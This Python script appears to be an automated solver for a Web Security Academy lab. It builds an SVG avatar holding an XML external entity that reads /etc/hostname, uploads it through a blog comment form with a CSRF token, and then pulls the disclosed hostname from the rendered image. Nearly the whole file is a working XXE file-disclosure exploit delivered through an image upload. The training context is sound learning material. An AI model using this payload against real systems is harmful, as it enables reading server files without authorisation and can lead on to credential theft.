from web_security_academy.core.logger import logger
from web_security_academy.core.utils import print_input
from urllib.parse import urlencode, urljoin
from bs4 import BeautifulSoup
from html import unescape
from lxml import etree


def solve_lab(session):
    csrf = session.get_csrf_token("/post?postId=1")

    # Construct SVG
    svg_namespace = "http://www.w3.org/2000/svg"
    svg = "{%s}" % svg_namespace
    nsmap = {None: svg_namespace}

    svg = etree.Element(
        "svg", nsmap=nsmap, width="128px", height="128px", version="1.1"
    )
    kwargs = {"font-family": "Consolas", "font-size": "16", "x": "0", "y": "16"}
    etree.SubElement(svg, "text", **kwargs).text = "&xxe;"

    doctype = '<!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>'
    avatar = etree.tostring(svg, doctype=doctype)
    avatar = unescape(avatar.decode())

    # Submit post comment
    files = {
        "avatar": ("avatar.svg", avatar),
    }

    data = {
        "csrf": csrf,
        "postId": "1",
        "comment": "comment",
        "name": "user",
        "email": "user@example.com",
        "website": "",
    }

    path = "/post/comment"
    logger.info(
        f'Injecting an XML external entity with the following POST request form data to "{path}":'
    )
    logger.info(f"data: {data}")
    logger.info(f"files: {files}")

    resp = session.post_path(path, data=data, files=files)
    if resp.status_code == 200:
        logger.success("XXE injection successful.")
    else:
        logger.failure("XXE injection not successful.")
        return

    # Extract avatar image URL
    path = "/post"
    params = {"postId": 1}
    logger.info(f'Extracting avatar image URL from "{path}?{urlencode(params)}"')

    resp = session.get_path(path, params=params)
    soup = BeautifulSoup(resp.text, "lxml")
    avatar_img = soup.select(".avatar")
    if len(avatar_img) == 0:
        logger.failure("Unable to extract avatar image URL.")
        return
    else:
        avatar_url = urljoin(session.url, avatar_img[-1].get("src"))
        logger.success(f"Avatar image URL: {avatar_url}")

    hostname = print_input("Enter the hostname from the provided URL here: ")
    session.submit_solution(hostname)
